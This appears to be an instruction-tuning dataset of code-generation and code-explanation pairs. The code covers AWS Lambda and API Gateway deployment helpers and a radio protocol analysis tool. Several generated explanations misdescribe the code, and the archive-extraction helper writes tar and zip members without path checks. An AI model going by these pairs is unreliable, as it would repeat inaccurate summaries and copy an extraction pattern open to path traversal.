{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nauthorizes API gateway to invoke a lambda function.", "response": "def add_permission_for_apigateway(self, function_name,\n                                      region_name, account_id,\n                                      rest_api_id, random_id=None):\n        # type: (str, str, str, str, Optional[str]) -> None\n        \"\"\"Authorize API gateway to invoke a lambda function is needed.\n\n        This method will first check if API gateway has permission to call\n        the lambda function, and only if necessary will it invoke\n        ``self.add_permission_for_apigateway(...).\n\n        \"\"\"\n        source_arn = self._build_source_arn_str(region_name, account_id,\n                                                rest_api_id)\n        self._add_lambda_permission_if_needed(\n            source_arn=source_arn,\n            function_arn=function_name,\n            service_name='apigateway',\n        )"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns the function policy for a lambda function.", "response": "def get_function_policy(self, function_name):\n        # type: (str) -> Dict[str, Any]\n        \"\"\"Return the function policy for a lambda function.\n\n        This function will extract the policy string as a json document\n        and return the json.loads(...) version of the policy.\n\n        \"\"\"\n        client = self._client('lambda')\n        try:\n            policy = client.get_policy(FunctionName=function_name)\n            return json.loads(policy['Policy'])\n        except client.exceptions.ResourceNotFoundException:\n            return {'Statement': []}"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef download_sdk(self, rest_api_id, output_dir,\n                     api_gateway_stage=DEFAULT_STAGE_NAME,\n                     sdk_type='javascript'):\n        # type: (str, str, str, str) -> None\n        \"\"\"Download an SDK to a directory.\n\n        This will generate an SDK and download it to the provided\n        ``output_dir``.  If you're using ``get_sdk_download_stream()``,\n        you have to handle downloading the stream and unzipping the\n        contents yourself.  This method handles that for you.\n\n        \"\"\"\n        zip_stream = self.get_sdk_download_stream(\n            rest_api_id, api_gateway_stage=api_gateway_stage,\n            sdk_type=sdk_type)\n        tmpdir = tempfile.mkdtemp()\n        with open(os.path.join(tmpdir, 'sdk.zip'), 'wb') as f:\n            f.write(zip_stream.read())\n        tmp_extract = os.path.join(tmpdir, 'extracted')\n        with zipfile.ZipFile(os.path.join(tmpdir, 'sdk.zip')) as z:\n            z.extractall(tmp_extract)\n        # The extract zip dir will have a single directory:\n        #  ['apiGateway-js-sdk']\n        dirnames = os.listdir(tmp_extract)\n        if len(dirnames) == 1:\n            full_dirname = os.path.join(tmp_extract, dirnames[0])\n            if os.path.isdir(full_dirname):\n                final_dirname = 'chalice-%s-sdk' % sdk_type\n                full_renamed_name = os.path.join(tmp_extract, final_dirname)\n                os.rename(full_dirname, full_renamed_name)\n                shutil.move(full_renamed_name, output_dir)\n                return\n        raise RuntimeError(\n            \"The downloaded SDK had an unexpected directory structure: %s\" %\n            (', '.join(dirnames)))", "response": "Download an SDK to a directory."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ngenerates an SDK for a given API Gateway stage and type and return a file like object that streams the contents of the generated SDK.", "response": "def get_sdk_download_stream(self, rest_api_id,\n                                api_gateway_stage=DEFAULT_STAGE_NAME,\n                                sdk_type='javascript'):\n        # type: (str, str, str) -> file\n        \"\"\"Generate an SDK for a given SDK.\n\n        Returns a file like object that streams a zip contents for the\n        generated SDK.\n\n        \"\"\"\n        response = self._client('apigateway').get_sdk(\n            restApiId=rest_api_id, stageName=api_gateway_stage,\n            sdkType=sdk_type)\n        return response['body']"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nverifying that the topic and function name of a topic is the current topic.", "response": "def verify_sns_subscription_current(self, subscription_arn, topic_name,\n                                        function_arn):\n        # type: (str, str, str) -> bool\n        \"\"\"Verify a subscription arn matches the topic and function name.\n\n        Given a subscription arn, verify that the associated topic name\n        and function arn match up to the parameters passed in.\n\n        \"\"\"\n        sns_client = self._client('sns')\n        try:\n            attributes = sns_client.get_subscription_attributes(\n                SubscriptionArn=subscription_arn)['Attributes']\n            return (\n                # Splitting on ':' is safe because topic names can't have\n                # a ':' char.\n                attributes['TopicArn'].rsplit(':', 1)[1] == topic_name and\n                attributes['Endpoint'] == function_arn\n            )\n        except sns_client.exceptions.NotFoundException:\n            return False"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nconnect an S3 bucket to a Lambda function.", "response": "def connect_s3_bucket_to_lambda(self, bucket, function_arn, events,\n                                    prefix=None, suffix=None):\n        # type: (str, str, List[str], OptStr, OptStr) -> None\n        \"\"\"Configure S3 bucket to invoke a lambda function.\n\n        The S3 bucket must already have permission to invoke the\n        lambda function before you call this function, otherwise\n        the service will return an error.  You can add permissions\n        by using the ``add_permission_for_s3_event`` below.  The\n        ``events`` param matches the event strings supported by the\n        service.\n\n        This method also only supports a single prefix/suffix for now,\n        which is what's offered in the Lambda console.\n\n        \"\"\"\n        s3 = self._client('s3')\n        existing_config = s3.get_bucket_notification_configuration(\n            Bucket=bucket)\n        # Because we're going to PUT this config back to S3, we need\n        # to remove `ResponseMetadata` because that's added in botocore\n        # and isn't a param of the put_bucket_notification_configuration.\n        existing_config.pop('ResponseMetadata', None)\n        existing_lambda_config = existing_config.get(\n            'LambdaFunctionConfigurations', [])\n        single_config = {\n            'LambdaFunctionArn': function_arn, 'Events': events\n        }  # type: Dict[str, Any]\n        filter_rules = []\n        if prefix is not None:\n            filter_rules.append({'Name': 'Prefix', 'Value': prefix})\n        if suffix is not None:\n            filter_rules.append({'Name': 'Suffix', 'Value': suffix})\n        if filter_rules:\n            single_config['Filter'] = {'Key': {'FilterRules': filter_rules}}\n        new_config = self._merge_s3_notification_config(existing_lambda_config,\n                                                        single_config)\n        existing_config['LambdaFunctionConfigurations'] = new_config\n        s3.put_bucket_notification_configuration(\n            Bucket=bucket,\n            NotificationConfiguration=existing_config,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nverifies that the uuid matches the resource and function arn provided.", "response": "def verify_event_source_current(self, event_uuid, resource_name,\n                                    service_name, function_arn):\n        # type: (str, str, str, str) -> bool\n        \"\"\"Check if the uuid matches the resource and function arn provided.\n\n        Given a uuid representing an event source mapping for a lambda\n        function, verify that the associated source arn\n        and function arn match up to the parameters passed in.\n\n        Instead of providing the event source arn, the resource name\n        is provided along with the service name.  For example, if we're\n        checking an SQS queue event source, the resource name would be\n        the queue name (e.g. ``myqueue``) and the service would be ``sqs``.\n\n        \"\"\"\n        client = self._client('lambda')\n        try:\n            attributes = client.get_event_source_mapping(UUID=event_uuid)\n            actual_arn = attributes['EventSourceArn']\n            arn_start, actual_name = actual_arn.rsplit(':', 1)\n            return (\n                actual_name == resource_name and\n                arn_start.startswith('arn:aws:%s' % service_name) and\n                attributes['FunctionArn'] == function_arn\n            )\n        except client.exceptions.ResourceNotFoundException:\n            return False"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nloading the chalice config file from the project directory.", "response": "def load_project_config(self):\n        # type: () -> Dict[str, Any]\n        \"\"\"Load the chalice config file from the project directory.\n\n        :raise: OSError/IOError if unable to load the config file.\n\n        \"\"\"\n        config_file = os.path.join(self.project_dir, '.chalice', 'config.json')\n        with open(config_file) as f:\n            return json.loads(f.read())"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ninvoke the deployed lambda function NAME.", "response": "def invoke(ctx, name, profile, stage):\n    # type: (click.Context, str, str, str) -> None\n    \"\"\"Invoke the deployed lambda function NAME.\"\"\"\n    factory = ctx.obj['factory']  # type: CLIFactory\n    factory.profile = profile\n\n    try:\n        invoke_handler = factory.create_lambda_invoke_handler(name, stage)\n        payload = factory.create_stdin_reader().read()\n        invoke_handler.invoke(payload)\n    except NoSuchFunctionError as e:\n        err = click.ClickException(\n            \"could not find a lambda function named %s.\" % e.name)\n        err.exit_code = 2\n        raise err\n    except botocore.exceptions.ClientError as e:\n        error = e.response['Error']\n        err = click.ClickException(\n            \"got '%s' exception back from Lambda\\n%s\"\n            % (error['Code'], error['Message']))\n        err.exit_code = 1\n        raise err\n    except UnhandledLambdaError:\n        err = click.ClickException(\n            \"Unhandled exception in Lambda function, details above.\")\n        err.exit_code = 1\n        raise err\n    except ReadTimeout as e:\n        err = click.ClickException(e.message)\n        err.exit_code = 1\n        raise err"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ngenerating a CodePipeline for a given codebuild image and source.", "response": "def generate_pipeline(ctx, codebuild_image, source, buildspec_file, filename):\n    # type: (click.Context, str, str, str, str) -> None\n    \"\"\"Generate a cloudformation template for a starter CD pipeline.\n\n    This command will write a starter cloudformation template to\n    the filename you provide.  It contains a CodeCommit repo,\n    a CodeBuild stage for packaging your chalice app, and a\n    CodePipeline stage to deploy your application using cloudformation.\n\n    You can use any AWS SDK or the AWS CLI to deploy this stack.\n    Here's an example using the AWS CLI:\n\n        \\b\n        $ chalice generate-pipeline pipeline.json\n        $ aws cloudformation deploy --stack-name mystack \\b\n            --template-file pipeline.json --capabilities CAPABILITY_IAM\n    \"\"\"\n    from chalice import pipeline\n    factory = ctx.obj['factory']  # type: CLIFactory\n    config = factory.create_config_obj()\n    p = pipeline.CreatePipelineTemplate()\n    params = pipeline.PipelineParameters(\n        app_name=config.app_name,\n        lambda_python_version=config.lambda_python_version,\n        codebuild_image=codebuild_image,\n        code_source=source,\n    )\n    output = p.create_template(params)\n    if buildspec_file:\n        extractor = pipeline.BuildSpecExtractor()\n        buildspec_contents = extractor.extract_buildspec(output)\n        with open(buildspec_file, 'w') as f:\n            f.write(buildspec_contents)\n    with open(filename, 'w') as f:\n        f.write(serialize_to_json(output))"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns a list of deployed resources associated with a given stage.", "response": "def deployed_resources(self, chalice_stage_name):\n        # type: (str) -> DeployedResources\n        \"\"\"Return resources associated with a given stage.\n\n        If a deployment to a given stage has never happened,\n        this method will return a value of None.\n\n        \"\"\"\n        # This is arguably the wrong level of abstraction.\n        # We might be able to move this elsewhere.\n        deployed_file = os.path.join(\n            self.project_dir, '.chalice', 'deployed',\n            '%s.json' % chalice_stage_name)\n        data = self._load_json_file(deployed_file)\n        if data is not None:\n            schema_version = data.get('schema_version', '1.0')\n            if schema_version != '2.0':\n                raise ValueError(\"Unsupported schema version (%s) in file: %s\"\n                                 % (schema_version, deployed_file))\n            return DeployedResources(data)\n        return self._try_old_deployer_values(chalice_stage_name)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef generate_policy(self, config):\n        # type: (Config) -> Dict[str, Any]\n        \"\"\"Auto generate policy for an application.\"\"\"\n        # Admittedly, this is pretty bare bones logic for the time\n        # being.  All it really does it work out, given a Config instance,\n        # which files need to analyzed and then delegates to the\n        # appropriately analyzer functions to do the real work.\n        # This may change in the future.\n        app_py = os.path.join(config.project_dir, 'app.py')\n        assert self._osutils.file_exists(app_py)\n        app_source = self._osutils.get_file_contents(app_py, binary=False)\n        app_policy = policy_from_source_code(app_source)\n        app_policy['Statement'].append(CLOUDWATCH_LOGS)\n        if config.subnet_ids and config.security_group_ids:\n            app_policy['Statement'].append(VPC_ATTACH_POLICY)\n        return app_policy", "response": "Auto generate policy for an application."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn all clients calls made in provided source code.", "response": "def get_client_calls(source_code):\n    # type: (str) -> APICallT\n    \"\"\"Return all clients calls made in provided source code.\n\n    :returns: A dict of service_name -> set([client calls]).\n        Example: {\"s3\": set([\"list_objects\", \"create_bucket\"]),\n                  \"dynamodb\": set([\"describe_table\"])}\n    \"\"\"\n    parsed = parse_code(source_code)\n    t = SymbolTableTypeInfer(parsed)\n    binder = t.bind_types()\n    collector = APICallCollector(binder)\n    api_calls = collector.collect_api_calls(parsed.parsed_ast)\n    return api_calls"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn client calls for a chalice app.", "response": "def get_client_calls_for_app(source_code):\n    # type: (str) -> APICallT\n    \"\"\"Return client calls for a chalice app.\n\n    This is similar to ``get_client_calls`` except it will\n    automatically traverse into chalice views with the assumption\n    that they will be called.\n\n    \"\"\"\n    parsed = parse_code(source_code)\n    parsed.parsed_ast = AppViewTransformer().visit(parsed.parsed_ast)\n    ast.fix_missing_locations(parsed.parsed_ast)\n    t = SymbolTableTypeInfer(parsed)\n    binder = t.bind_types()\n    collector = APICallCollector(binder)\n    api_calls = collector.collect_api_calls(parsed.parsed_ast)\n    return api_calls"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nmatch the url against a set of known routes.", "response": "def match_route(self, url):\n        # type: (str) -> MatchResult\n        \"\"\"Match the url against known routes.\n\n        This method takes a concrete route \"/foo/bar\", and\n        matches it against a set of routes.  These routes can\n        use param substitution corresponding to API gateway patterns.\n        For example::\n\n            match_route('/foo/bar') -> '/foo/{name}'\n\n        \"\"\"\n        # Otherwise we need to check for param substitution\n        parsed_url = urlparse(url)\n        parsed_qs = parse_qs(parsed_url.query, keep_blank_values=True)\n        query_params = {k: v[-1] for k, v in parsed_qs.items()}\n        path = parsed_url.path\n        # API Gateway removes the trailing slash if the route is not the root\n        # path. We do the same here so our route matching works the same way.\n        if path != '/' and path.endswith('/'):\n            path = path[:-1]\n        parts = path.split('/')\n        captured = {}\n        for route_url in self.route_urls:\n            url_parts = route_url.split('/')\n            if len(parts) == len(url_parts):\n                for i, j in zip(parts, url_parts):\n                    if j.startswith('{') and j.endswith('}'):\n                        captured[j[1:-1]] = i\n                        continue\n                    if i != j:\n                        break\n                else:\n                    return MatchResult(route_url, captured, query_params)\n        raise ValueError(\"No matching route found for: %s\" % url)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _prepare_authorizer_event(self, arn, lambda_event, lambda_context):\n        # type: (str, EventType, LambdaContext) -> EventType\n        \"\"\"Translate event for an authorizer input.\"\"\"\n        authorizer_event = lambda_event.copy()\n        authorizer_event['type'] = 'TOKEN'\n        try:\n            authorizer_event['authorizationToken'] = authorizer_event.get(\n                'headers', {})['authorization']\n        except KeyError:\n            raise NotAuthorizedError(\n                {'x-amzn-RequestId': lambda_context.aws_request_id,\n                 'x-amzn-ErrorType': 'UnauthorizedException'},\n                b'{\"message\":\"Unauthorized\"}')\n        authorizer_event['methodArn'] = arn\n        return authorizer_event", "response": "Translate an authorizer input into a dictionary of fields that can be used to send to the authorizer."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nset initial parameters for default modulator if it was not edited by user previously.", "response": "def bootstrap_modulator(self, protocol: ProtocolAnalyzer):\n        \"\"\"\n        Set initial parameters for default modulator if it was not edited by user previously\n        :return:\n        \"\"\"\n        if len(self.modulators) != 1 or len(self.table_model.protocol.messages) == 0:\n            return\n\n        modulator = self.modulators[0]\n        modulator.samples_per_bit = protocol.messages[0].bit_len\n\n        if protocol.signal:\n            modulator.sample_rate = protocol.signal.sample_rate\n            modulator.modulation_type = protocol.signal.modulation_type\n            auto_freq = modulator.estimate_carrier_frequency(protocol.signal, protocol)\n            if auto_freq is not None and auto_freq != 0:\n                modulator.carrier_freq_hz = auto_freq\n\n        self.show_modulation_info()"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nmodulate the data of the current state of the modulated message.", "response": "def modulate_data(self, buffer: np.ndarray) -> np.ndarray:\n        \"\"\"\n        \n        :param buffer: Buffer in which the modulated data shall be written, initialized with zeros\n        :return: \n        \"\"\"\n        self.ui.prBarGeneration.show()\n        self.ui.prBarGeneration.setValue(0)\n        self.ui.prBarGeneration.setMaximum(self.table_model.row_count)\n        self.modulation_msg_indices.clear()\n\n        pos = 0\n        for i in range(0, self.table_model.row_count):\n            message = self.table_model.protocol.messages[i]\n            modulator = self.__get_modulator_of_message(message)\n            # We do not need to modulate the pause extra, as result is already initialized with zeros\n            modulated = modulator.modulate(start=0, data=message.encoded_bits, pause=0)\n            buffer[pos:pos + len(modulated)] = modulated\n            pos += len(modulated) + message.pause\n            self.modulation_msg_indices.append(pos)\n            self.ui.prBarGeneration.setValue(i + 1)\n            QApplication.instance().processEvents()\n\n        self.ui.prBarGeneration.hide()\n        return buffer"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef refresh_existing_encodings(self, encodings_from_file):\n        update = False\n\n        for msg in self.table_model.protocol.messages:\n            i = next((i for i, d in enumerate(encodings_from_file) if d.name == msg.decoder.name), 0)\n            if msg.decoder != encodings_from_file[i]:\n                update = True\n                msg.decoder = encodings_from_file[i]\n                msg.clear_decoded_bits()\n                msg.clear_encoded_bits()\n\n        if update:\n            self.refresh_table()\n            self.refresh_estimated_time()", "response": "Refresh existing encodings for messages when encoding was changed by user in dialog."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef protocols(self):\n        if self.__protocols is None:\n            self.__protocols = self.proto_tree_model.protocols\n        return self.__protocols", "response": "returns a list of ProtocolAnalyzer objects for the current node"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn a list of visible protocols in this hierarchy.", "response": "def protocol_list(self):\n        \"\"\"\n        :return: visible protocols\n        :rtype: list of ProtocolAnalyzer\n        \"\"\"\n        result = []\n        for group in self.groups:\n            result.extend(group.protocols)\n        return result"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef full_protocol_list(self):\n        result = []\n        for group in self.groups:\n            result.extend(group.all_protocols)\n        return result", "response": "returns a list of all protocols including not shown ones"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef refresh_existing_encodings(self):\n        update = False\n\n        for msg in self.proto_analyzer.messages:\n            i = next((i for i, d in enumerate(self.decodings) if d.name == msg.decoder.name), 0)\n            if msg.decoder != self.decodings[i]:\n                update = True\n                msg.decoder = self.decodings[i]\n                msg.clear_decoded_bits()\n                msg.clear_encoded_bits()\n\n        if update:\n            self.protocol_model.update()\n            self.label_value_model.update()", "response": "Refresh existing encodings for messages when encoding was changed by user in dialog."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef set_show_only_status(self):\n        if self.ui.chkBoxShowOnlyDiffs.isChecked() and not self.ui.cbShowDiffs.isChecked():\n            self.ui.cbShowDiffs.setChecked(True)\n            self.show_differences(True)\n\n        if self.ui.chkBoxOnlyShowLabelsInProtocol.isChecked() and self.ui.chkBoxShowOnlyDiffs.isChecked():\n            self.show_only_diffs_and_labels()\n        elif self.ui.chkBoxOnlyShowLabelsInProtocol.isChecked() and not self.ui.chkBoxShowOnlyDiffs.isChecked():\n            self.show_only_labels()\n        elif not self.ui.chkBoxOnlyShowLabelsInProtocol.isChecked() and self.ui.chkBoxShowOnlyDiffs.isChecked():\n            self.show_only_diffs()\n        else:\n            self.restore_visibility()\n\n        self.ui.tblViewProtocol.resize_columns()", "response": "Sets the show only status of the current locale."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nwrapping method selecting the backend to assign the protocol field to the given messages.", "response": "def find_field(self, messages):\n        \"\"\"\n        Wrapper method selecting the backend to assign the protocol field.\n        Various strategies are possible e.g.:\n        1) Heuristics e.g. for Preamble\n        2) Scoring based e.g. for Length\n        3) Fulltext search for addresses based on participant subgroups\n\n        :param messages: messages a field shall be searched for\n        :type messages: list of Message\n        \"\"\"\n        try:\n            if self.backend == self.Backend.python:\n                self._py_find_field(messages)\n            elif self.backend == self.Backend.cython:\n                self._cy_find_field(messages)\n            elif self.backend == self.Backend.plainc:\n                self._c_find_field(messages)\n            else:\n                raise ValueError(\"Unsupported backend {}\".format(self.backend))\n        except NotImplementedError:\n            logger.info(\"Skipped {} because not implemented yet\".format(self.__class__.__name__))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nassign message types based on the clusters.", "response": "def assign_messagetypes(self, messages, clusters):\n        \"\"\"\n        Assign message types based on the clusters. Following rules:\n        1) Messages from different clusters will get different message types\n        2) Messages from same clusters will get same message type\n        3) The new message type will copy over the existing labels\n        4) No new message type will be set for messages, that already have a custom message type assigned\n\n        For messages with clustername \"default\" no new message type will be created\n\n        :param messages: Messages, that messagetype needs to be clustered\n        :param clusters: clusters for the messages\n        :type messages: list[Message]\n        :type clusters: dict[str, set[int]]\n        :return:\n        \"\"\"\n        for clustername, clustercontent in clusters.items():\n            if clustername == \"default\":\n                # Do not force the default message type\n                continue\n\n            for msg_i in clustercontent:\n                msg = messages[msg_i]\n                if msg.message_type == self.messagetypes[0]:\n                    # Message has default message type\n                    # Copy the existing labels and create a new message type\n                    # if it was not already done\n                    try:\n                        msg_type = next(mtype for mtype in self.messagetypes if mtype.name == clustername)\n                    except StopIteration:\n                        msg_type = MessageType(name=clustername, iterable=msg.message_type)\n                        msg_type.assigned_by_logic_analyzer = True\n                        self.messagetypes.append(msg_type)\n                    msg.message_type = msg_type"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nperform the short - time Fourier transform to get the spectrogram for the given samples", "response": "def stft(self, samples: np.ndarray):\n        \"\"\"\n        Perform Short-time Fourier transform to get the spectrogram for the given samples\n        :return: short-time Fourier transform of the given signal\n        \"\"\"\n        window = self.window_function(self.window_size)\n        hop_size = self.hop_size\n\n        if len(samples) < self.window_size:\n            samples = np.append(samples, np.zeros(self.window_size - len(samples)))\n\n        num_frames = max(1, (len(samples) - self.window_size) // hop_size + 1)\n\n        # Get frames as numpy view with stride_tricks to save RAM\n        # Same as: frames = [padded_samples[i*hop_size:i*hop_size+self.window_size] for i in range(num_frames)]\n        shape = (num_frames, self.window_size)\n        strides = (hop_size * samples.strides[-1], samples.strides[-1])\n        frames = np.lib.stride_tricks.as_strided(samples, shape=shape, strides=strides)\n\n        result = np.fft.fft(frames * window, self.window_size) / np.atleast_1d(self.window_size)\n        return result"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef export_to_fta(self, sample_rate, filename: str, include_amplitude=False):\n        spectrogram = self.__calculate_spectrogram(self.samples)\n        spectrogram = np.flipud(spectrogram.T)\n        if include_amplitude:\n            result = np.empty((spectrogram.shape[0], spectrogram.shape[1], 3),\n                              dtype=[('f', np.float64), ('t', np.uint32), ('a', np.float32)])\n        else:\n            result = np.empty((spectrogram.shape[0], spectrogram.shape[1], 2),\n                              dtype=[('f', np.float64), ('t', np.uint32)])\n\n        fft_freqs = np.fft.fftshift(np.fft.fftfreq(spectrogram.shape[0], 1/sample_rate))\n        time_width = 1e9 * ((len(self.samples) / sample_rate) / spectrogram.shape[1])\n\n        for i in range(spectrogram.shape[0]):\n            for j in range(spectrogram.shape[1]):\n                if include_amplitude:\n                    result[i, j] = (fft_freqs[i], int(j*time_width), spectrogram[i, j])\n                else:\n                    result[i, j] = (fft_freqs[i], int(j * time_width))\n\n        result.tofile(filename)", "response": "Export to Fourier Transform"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef create_image(data: np.ndarray, colormap, data_min=None, data_max=None, normalize=True) -> QImage:\n        image_data = Spectrogram.apply_bgra_lookup(data, colormap, data_min, data_max, normalize)\n\n        if not image_data.flags['C_CONTIGUOUS']:\n            logger.debug(\"Array was not C_CONTIGUOUS. Converting it.\")\n            image_data = np.ascontiguousarray(image_data)\n\n        try:\n            # QImage constructor needs inverted row/column order\n            image = QImage(image_data.ctypes.data, image_data.shape[1], image_data.shape[0], QImage.Format_ARGB32)\n        except Exception as e:\n            logger.error(\"could not create image \" + str(e))\n            return QImage()\n\n        image.data = image_data\n        return image", "response": "Create QImage from ARGB array."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nset the modulation type of the modulation.", "response": "def modulation_type(self, value: int):\n        \"\"\"\n        0 - \"ASK\", 1 - \"FSK\", 2 - \"PSK\", 3 - \"APSK (QAM)\"\n\n        :param value:\n        :return:\n        \"\"\"\n        if self.__modulation_type != value:\n            self.__modulation_type = value\n            self._qad = None\n\n            self.modulation_type_changed.emit(self.__modulation_type)\n            if not self.block_protocol_update:\n                self.protocol_needs_update.emit()"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef estimate_frequency(self, start: int, end: int, sample_rate: float):\n        # ensure power of 2 for faster fft\n        length = 2 ** int(math.log2(end - start))\n        data = self.data[start:start + length]\n\n        try:\n            w = np.fft.fft(data)\n            frequencies = np.fft.fftfreq(len(w))\n            idx = np.argmax(np.abs(w))\n            freq = frequencies[idx]\n            freq_in_hertz = abs(freq * sample_rate)\n        except ValueError:\n            # No samples in window e.g. start == end, use a fallback\n            freq_in_hertz = 100e3\n\n        return freq_in_hertz", "response": "Estimate the frequency of the baseband signal using FFT\n           "}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns the range of the selected entries in the current tree.", "response": "def selection_range(self):\n        \"\"\"\n        :rtype: int, int, int, int\n        \"\"\"\n        selected = self.selectionModel().selection()\n        \"\"\":type: QItemSelection \"\"\"\n\n        if selected.isEmpty():\n            return -1, -1, -1, -1\n\n        min_row = numpy.min([rng.top() for rng in selected])\n        max_row = numpy.max([rng.bottom() for rng in selected])\n        start = numpy.min([rng.left() for rng in selected])\n        end = numpy.max([rng.right() for rng in selected]) + 1\n\n        return min_row, max_row, start, end"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nfix stdout and stderr for frozen windows apps.", "response": "def fix_windows_stdout_stderr():\n    \"\"\"\n    Processes can't write to stdout/stderr on frozen windows apps because they do not exist here\n    if process tries it anyway we get a nasty dialog window popping up, so we redirect the streams to a dummy\n    see https://github.com/jopohl/urh/issues/370\n    \"\"\"\n\n    if hasattr(sys, \"frozen\") and sys.platform == \"win32\":\n        try:\n            sys.stdout.write(\"\\n\")\n            sys.stdout.flush()\n        except:\n            class DummyStream(object):\n                def __init__(self): pass\n\n                def write(self, data): pass\n\n                def read(self, data): pass\n\n                def flush(self): pass\n\n                def close(self): pass\n\n            sys.stdout, sys.stderr, sys.stdin = DummyStream(), DummyStream(), DummyStream()\n            sys.__stdout__, sys.__stderr__, sys.__stdin__ = DummyStream(), DummyStream(), DummyStream()"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nbuild the order of components based on their priority and predecessors.", "response": "def build_component_order(self):\n        \"\"\"\n        Build the order of component based on their priority and predecessors\n\n        :rtype: list of Component\n        \"\"\"\n        present_components = [item for item in self.__dict__.values() if isinstance(item, Component) and item.enabled]\n        result = [None] * len(present_components)\n        used_prios = set()\n        for component in present_components:\n            index = component.priority % len(present_components)\n            if index in used_prios:\n                raise ValueError(\"Duplicate priority: {}\".format(component.priority))\n            used_prios.add(index)\n\n            result[index] = component\n\n        # Check if predecessors are valid\n        for i, component in enumerate(result):\n            if any(i < result.index(pre) for pre in component.predecessors):\n                raise ValueError(\"Component {} comes before at least one of its predecessors\".format(component))\n\n        return result"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef find_candidates(candidates):\n\n        result = defaultdict(int)\n        for i, c_i in enumerate(candidates):\n            for j in range(i, len(candidates)):\n                lcs = util.longest_common_substring(c_i.hex_value, candidates[j].hex_value)\n                if lcs:\n                    result[lcs] += 1\n\n        return result", "response": "Find candidate addresses using LCS algorithm."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nchoose a pair of address candidates ensuring they have the same length and starting with the highest scored ones.", "response": "def choose_candidate_pair(candidates):\n        \"\"\"\n        Choose a pair of address candidates ensuring they have the same length and starting with the highest scored ones\n\n        :type candidates: dict[str, int]\n        :param candidates: Count how often the longest common substrings appeared in the messages\n        :return:\n        \"\"\"\n        highscored = sorted(candidates, key=candidates.get, reverse=True)\n        for i, h_i in enumerate(highscored):\n            for h_j in highscored[i+1:]:\n                if len(h_i) == len(h_j):\n                    yield (h_i, h_j)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nextract each archive from the list of filenames.", "response": "def uncompress_archives(file_names, temp_dir):\n    \"\"\"\n    Extract each archive from the list of filenames.\n    Normal files stay untouched.\n    Add all files to the Recent Files.\n    :type file_names: list of str\n    :type temp_dir: str\n    :rtype: list of str\n    \"\"\"\n    result = []\n    for filename in file_names:\n        if filename.endswith(\".tar\") or filename.endswith(\".tar.gz\") or filename.endswith(\".tar.bz2\"):\n            obj = tarfile.open(filename, \"r\")\n            extracted_file_names = []\n            for j, member in enumerate(obj.getmembers()):\n                obj.extract(member, temp_dir)\n                extracted_filename = os.path.join(temp_dir, obj.getnames()[j])\n                extracted_file_names.append(extracted_filename)\n                archives[extracted_filename] = filename\n            result.extend(extracted_file_names[:])\n        elif filename.endswith(\".zip\"):\n            obj = zipfile.ZipFile(filename)\n            extracted_file_names = []\n            for j, info in enumerate(obj.infolist()):\n                obj.extract(info, path=temp_dir)\n                extracted_filename = os.path.join(temp_dir, obj.namelist()[j])\n                extracted_file_names.append(extracted_filename)\n                archives[extracted_filename] = filename\n            result.extend(extracted_file_names[:])\n        else:\n            result.append(filename)\n\n    return result"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nwrites modulators to the project file.", "response": "def write_modulators_to_project_file(self, tree=None):\n        \"\"\"\n        :type modulators: list of Modulator\n        :return:\n        \"\"\"\n        if self.project_file is None or not self.modulators:\n            return\n\n        if tree is None:\n            tree = ET.parse(self.project_file)\n\n        root = tree.getroot()\n        root.append(Modulator.modulators_to_xml_tag(self.modulators))\n\n        tree.write(self.project_file)"}
